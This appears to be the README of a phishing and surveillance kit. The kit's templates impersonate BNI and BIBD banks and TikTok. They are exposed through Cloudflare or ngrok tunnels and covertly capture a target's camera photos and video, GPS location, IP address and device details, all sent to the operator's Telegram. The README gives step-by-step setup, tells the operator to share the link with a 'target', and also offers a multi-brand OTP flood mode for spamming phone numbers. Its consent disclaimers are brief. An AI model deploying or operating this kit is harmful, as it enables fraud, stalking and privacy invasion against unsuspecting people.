# METACYTECH Tools

Multi-template social engineering awareness & phishing simulation platform.

## Features

- **Multi-template system** — BNI, TikTok, BIBD, OTP Flood
- **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
- **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
- **Camera & Location capture** — permission-based data collection
- **Telegram integration** — real-time data delivery
- **OTP Flood mode** — multi-brand OTP spam
- **Cross-platform** — Windows & Termux support
- **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
- **Premium terminal UI** — clean animations, no emoji in terminal output

## Requirements

| Component | Minimum |
|-----------|---------|
| Python | 3.13+ |
| Node.js | 20.x+ |
| NPM | 10.x+ |
| Cloudflared | 2026+ (optional, auto fallback to ngrok) |
| OS | Windows 10+ / Termux (Android) |

### Install Cloudflared

**Windows:** Download from https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/ and install to `C:\Program Files (x86)\cloudflared\`

**Termux:** `pkg install cloudflared -y`

### Setup Telegram Bot

1. Chat [@BotFather](https://t.me/BotFather) on Telegram
2. Send `/newbot` and follow instructions
3. Get your **Bot Token** (format: `123456:ABC-DEF...`)
4. Create a group, add bot as admin
5. Send a message to the group, then visit `https://api.telegram.org/bot<TOKEN>/getUpdates`
6. Get **Chat ID** from the JSON response

Create `.env.local` in project root:
```
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=-100123456789
```

## Usage

### Run Launcher

**Windows:**
```
python launcher.py
```
Or double-click `run.bat`

**Termux:**
```
cd ~/metacytech-tools
python launcher.py
```

### Flow

On first run, select a template:

```
  Pilih template:
  [1] BNI  Bank Transfer Verification
  [2] TikTok  Video Share Link
  [3] BIBD  Brunei Darussalam
  [4] OTP Flood  Multi-Brand Spam

  Pilih template (1-4):
```

The system will then:

1. Apply template files
2. Build Next.js app (Turbopack)
3. Start server (port 3000)
4. Start Cloudflare Tunnel (fallback to ngrok if needed)
5. Update metadataBase with tunnel URL
6. Rebuild & restart server
7. Show **PUBLIC URL** to share

**Terminal output:**
```
  ok  Template: TikTok - Video Share Link

  ▓▓▓░░░░░░░░░░░░░  applying template
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  applying template

  ▓▓▓░░░░░░░░░░░░░  building
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  building

  ▓▓▓░░░░░░░░░░░░░  starting server
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting server

  ▓▓▓░░░░░░░░░░░░░  starting tunnel
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting tunnel

  ▓▓▓░░░░░░░░░░░░░  rebuilding with url
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding with url

  ▓▓▓░░░░░░░░░░░░░  rebuilding
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding

  url  https://xxxx-xxxx-xxxx-xxxx.trycloudflare.com
  local  http://localhost:3000
```

### Main Menu

```
  [1]  Mulai Semua
       Build + Server + Cloudflare Tunnel
  [2]  Hentikan Semua
  [3]  Status
  [4]  Salin URL
  [5]  Ganti Template
  [6]  Keluar

  Pilih menu (1-6):
```

### Getting Target Data

1. Share the **PUBLIC URL** with your target
2. Monitor Telegram — data is sent in real-time when the target:
   - Grants camera permission
   - Grants location access
3. **Data received:**
   - Photo from front camera & Video
   - GPS location (with Google Maps link)
   - Device info (OS, browser, RAM, CPU, battery)
   - IP address & ISP
   - Screen resolution & orientation

## Available Templates

| # | Template | Description | Mode |
|---|----------|-------------|------|
| 1 | BNI | Bank Transfer Verification | Web |
| 2 | TikTok | Video Share Link (camera + location) | Web |
| 3 | BIBD | Bank Islam Brunei Darussalam | Web |
| 4 | OTP Flood | Multi-brand OTP spam (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, etc.) | CLI |

## Troubleshooting

### Cloudflared SSL Certificate Error (Termux)
```
failed to request quick Tunnel: tls: failed to verify certificate
```

**Solution:**
```
pkg install ca-certificates openssl-tool -y
pkg upgrade -y
```

If still failing, system **auto-fallback to ngrok**. Install ngrok:
```
cd ~
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
unzip ngrok-v3-stable-linux-arm64.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
```

### "Could not get tunnel URL"

Check if cloudflared/ngrok is running:
```
ps aux | grep cloudflared
ps aux | grep ngrok
```

Check tunnel.log:
```
cat tunnel.log
```

Manual test cloudflared:
```
cloudflared tunnel --url http://localhost:3000
```

### Telegram Bot Not Sending Data

Check token & chat ID:
```
cat .env.local
```

Manual test with curl:
```
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
```

### Next.js Build Error

Clear cache and rebuild:
```
rm -rf .next node_modules
npm install
npm run build
```

### Port 3000 Already in Use

**Windows:**
```
netstat -ano | findstr :3000
taskkill /PID <PID> /F
```

**Termux:**
```
lsof -i :3000
kill -9 <PID>
```

## FAQ

**Q: Is this tool legal?**
A: Yes, for authorized security testing and awareness training with **written consent**. Unauthorized use is **ILLEGAL**.

**Q: Does the target know they are being tested?**
A: No, unless you inform them afterwards (recommended for ethical testing).

**Q: Where is data stored?**
A: Data is sent directly to your Telegram bot. **NOT** stored on our servers.

**Q: Can it run 24/7?**
A: Free Cloudflare Tunnel does not guarantee 100% uptime. For production, use a VPS + custom domain.

**Q: Can I create custom templates?**
A: Yes! Create a new folder in `templates/<name>` with `page.tsx`, `layout.tsx`, and assets in `public/`.

**Q: Why is build slow on Termux?**
A: Next.js 16 Turbopack does not support ARM. The system auto-downgrades to Next.js 15 with Webpack (slower but stable).

**Q: Why no CAPTCHA?**
A: CAPTCHA was removed as it was ineffective. The system now uses camera & location permission which looks more professional.

**Q: How to use OTP Flood mode?**
A: Select template [4] OTP Flood, then follow the interactive menu to send OTP to target numbers.

## Legal & Ethics

**IMPORTANT — READ THIS!**

1. **Written consent REQUIRED** — Always obtain written permission before security testing
2. **Do Not Misuse** — This tool is for education and authorized testing ONLY
3. **User Responsibility** — You are fully responsible for how you use this tool
4. **Applicable Laws** — Illegal use may be subject to:
   - Indonesia: UU ITE Pasal 30-35
   - USA: Computer Fraud and Abuse Act
   - EU: GDPR violations
   - And other applicable laws

**Permitted use cases:**
- Security awareness training with consent
- Authorized penetration testing with clear scope
- Red team exercises with contract
- Educational purposes in controlled environment

**Prohibited use cases:**
- Phishing without consent
- Unauthorized data collection
- Identity theft
- Any illegal activity

## Project Structure

```
metacytech-tools/
├── src/
│   └── app/
│       ├── page.tsx              # Main page (replaced by template)
│       ├── layout.tsx            # Root layout
│       └── api/
│           ├── telegram/route.ts # Telegram API endpoint
│           └── capture/route.ts  # Data capture endpoint
├── templates/
│   ├── bni/
│   │   ├── page.tsx
│   │   ├── layout.tsx
│   │   └── public/
│   ├── tiktok/
│   │   ├── page.tsx
│   │   ├── layout.tsx
│   │   └── public/
│   └── bibd/
│       ├── page.tsx
│       ├── layout.tsx
│       └── public/
├── modules/
│   ├── otp_flood/
│   │   ├── finder.py             # Target number parser
│   │   └── trigger.py            # OTP trigger engine
│   └── reports/                  # OTP flood reports
├── public/                       # Static assets
├── launcher.py                   # Main launcher script
├── run.bat                       # Windows launcher
├── .env.local                    # Environment variables (NOT committed)
├── package.json                  # Node.js dependencies
└── requirements.txt              # Python dependencies
```

## Contributing

Contributions are welcome! Please ensure:
1. Follow ethical guidelines
2. Test thoroughly on Windows & Termux
3. Document all changes
4. Create a pull request with clear description

## License

MIT License — See [LICENSE](LICENSE) for details

## Author

**Iqbal**
- GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
- Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)

## Acknowledgments

- Next.js Team for the amazing framework
- Cloudflare for free tunnel service
- Telegram for bot API
- Community for feedback & contributions

---

**Gunakan dengan bijak dan bertanggung jawab.**

Made for Security Research & Awareness.
